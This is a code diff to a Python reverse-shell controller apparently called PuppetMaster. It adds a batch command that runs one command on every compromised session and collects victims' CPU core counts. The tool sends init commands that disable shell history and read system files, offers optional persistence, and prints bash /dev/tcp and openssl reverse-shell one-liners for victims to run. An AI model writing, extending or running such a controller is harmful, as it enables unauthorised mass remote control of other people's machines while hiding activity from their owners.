@@ -1,11 +1,12 @@
-from qqwry import QQwry
-import readline
-import datetime
-import asyncio
-import hashlib
-import random
 import sys
 import ssl
+import random
+import hashlib
+import asyncio
+import datetime
+import readline
+import traceback
+from qqwry import QQwry
 
 print('''\033[1;37m
                                                                 
@@ -51,7 +52,7 @@ class PuppetMaster:
 Puppet_Master = PuppetMaster()
 
 def completer(text, state):
-    func = ['cls', 'clear', 'listeners', 'handlers', 'sessions', 'execute ', 'exit', 'use '] + [ _['hash'] for _ in Puppet_Master.sessions ]
+    func = ['cls', 'clear', 'listeners', 'handlers', 'sessions', 'execute ', 'exit', 'BATCH-EXECUTE ', 'use '] + [ _['hash'] for _ in Puppet_Master.sessions ]
     matches = [ _ for _ in func if _.startswith(text) ]
     if state < len(matches):
         return matches[state]
@@ -63,7 +64,6 @@ readline.set_completer(completer)
 
 IPSelect = QQwry()
 IPSelect.load_file("qqwry.dat")
-#session["org"] = IPSelect.lookup(ipstr)
 
 async def handle_shell_init(reader, writer):
 
@@ -80,10 +80,11 @@ async def handle_shell_init(reader, writer):
     init_command += "export HISTSIZE=0;"
     init_command += f"echo {randomStringWhoamiPrefix} && whoami && echo {randomStringWhoamiSuffix}\n"
     init_command += f"echo {randomStringHostnamePrefix} && cat /etc/hostname && echo {randomStringHostnameSuffix}\n"
-    init_command += f"echo {randomStringPrefix} && whoami && cat /proc/version /etc/fstab /proc/net/route && echo {randomStringSuffix}\n"
+    init_command += f"echo {randomStringPrefix} && whoami && cat /proc/version /etc/fstab /proc/net/route /proc/cpuinfo && echo {randomStringSuffix}\n"
     writer.write( init_command.encode() )
     await writer.drain()
 
+    #如果持久化选项为True则执行deamon进程持久化命令
     if Puppet_Master.Persistence:
         writer.write( Puppet_Master.PersistenceCommand.encode() + "\n".encode() )
         await writer.drain()
@@ -115,6 +116,9 @@ async def handle_shell_init(reader, writer):
                         randomStringHostnameSuffix
                         ).strip()
 
+                #获取CPU核心数
+                session_cpu_core = str(puppetHash.count("processor"))
+                #根据系统信息计算Session Hash
                 session_hash = hashlib.md5(puppetHash.encode()).hexdigest()
 
                 session = dict()
@@ -131,6 +135,7 @@ async def handle_shell_init(reader, writer):
                 session["reader"]   = reader
                 session["writer"]   = writer
                 session["hash"]     = session_hash
+                session["core"]     = session_cpu_core
                 session["org"]      = str()
 
                 if ( session["hash"] not in [ _["hash"] for _ in Puppet_Master.sessions ] ) or ( Puppet_Master.DuplicateSession ):
@@ -138,7 +143,7 @@ async def handle_shell_init(reader, writer):
 
                     session["org"] = org[0]+org[1]
                     Puppet_Master.sessions.append(session)
-                    print(f'\033[1;32m[*]\033[0m Session \033[1;37m{session_hash}\033[0m {hostname} {username}  \033[1;37m{sockname} -> {peername}\033[0m {datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")}')
+                    PrintInfo('Session \033[1;37m{session_hash}\033[0m {hostname} {username}  \033[1;37m{sockname} -> {peername}\033[0m {datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")}')
                     break
 
                 else:
@@ -157,6 +162,7 @@ async def handle_shell_init(reader, writer):
             print("Ctrl + C")
 
         except Exception as e :
+            print(traceback.format_exc())
             print(e)
 
     while writer.is_closing()==False:
@@ -196,7 +202,7 @@ async def MasterConsole():
 
         elif console_cmd.split() and console_cmd.split()[0] == "sessions" :
             for session in Puppet_Master.sessions:
-                print(f"\033[1;37m{session['hash']}\033[0m  {session['hostname'].ljust(20,' ')} {session['username'].ljust(8,' ')}  {session['sockname']} -> {session['peername']}  {session['org']}  {session['inittime']}")
+                print(f"\033[1;37m{session['hash']}\033[0m  {session['hostname'].ljust(20,' ')} {session['username'].ljust(8,' ')} {session['core'].ljust(2,' ')} {session['sockname']} -> {session['peername'].ljust(21,' ')}  {session['inittime']} {session['org']} ")
             
         elif console_cmd.split() and console_cmd.split()[0] == "listerner":
             print()
@@ -211,6 +217,17 @@ async def MasterConsole():
                     execute_cmd = " ".join( console_cmd.split()[console_cmd.split().index("execute")+1:] )
 
                 execute_result = await Puppet_Master.execute_cmd( execute_cmd )
+
+        elif console_cmd.split() and console_cmd.split()[0] == "BATCH-EXECUTE"  :
+                if len(console_cmd.split()) > 1 :
+                    execute_cmd = " ".join( console_cmd.split()[console_cmd.split().index("BATCH-EXECUTE")+1:] )
+
+                for session in Puppet_Master.sessions:
+                    Puppet_Master.current_session = Puppet_Master.sessions[Puppet_Master.sessions.index(session)]
+                    execute_result = await Puppet_Master.execute_cmd( execute_cmd )
+                    PrintInfo( Puppet_Master.current_session+" Executed." )
+
+                Puppet_Master.current_session = None
 
         elif console_cmd.strip() == "shell"  :
             if Puppet_Master.current_session:
@@ -239,6 +256,10 @@ async def MasterConsole():
         else:
             continue
     return
+def PrintInfo(string):
+    prefix = "\033[1;32m[*]\033[0m "
+    print( prefix + string )
+    return prefix + string
 
 def randomString():
     return ''.join(random.sample('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789', 16))
@@ -263,11 +284,11 @@ async def main():
     addr = addr[0]+":"+str(addr[1])
     ssl_addr = ssl_addr[0]+":"+str(ssl_addr[1])
 
-    print(f"\033[1;32m[*]\033[0m socketListener : {addr}")
-    print(f"\033[1;32m[*]\033[0m SSLSocketListener : {ssl_addr}")
+    PrintInfo("socketListener : "+addr)
+    PrintInfo("SSLSocketListener : "+ssl_addr)
 
-    print(f"\033[1;32m[*]\033[0m LinuxReverseTCPCommand : bash -i>&/dev/tcp/{reverse_host}/{reverse_tcp_port} 0>&1")
-    print(f"\033[1;32m[*]\033[0m LinuxReverseSSLCommand : mkfifo /tmp/-;bash -i</tmp/-|&openssl s_client -quiet -connect {reverse_host}:{reverse_ssl_port}>/tmp/-;rm /tmp/-")
+    PrintInfo( f"LinuxReverseTCPCommand : bash -i>&/dev/tcp/{reverse_host}/{reverse_tcp_port} 0>&1" )
+    PrintInfo( f"LinuxReverseSSLCommand : mkfifo /tmp/-;bash -i</tmp/-|&openssl s_client -quiet -connect {reverse_host}:{reverse_ssl_port}>/tmp/-;rm /tmp/-" )
     print()
 
     console = await MasterConsole()
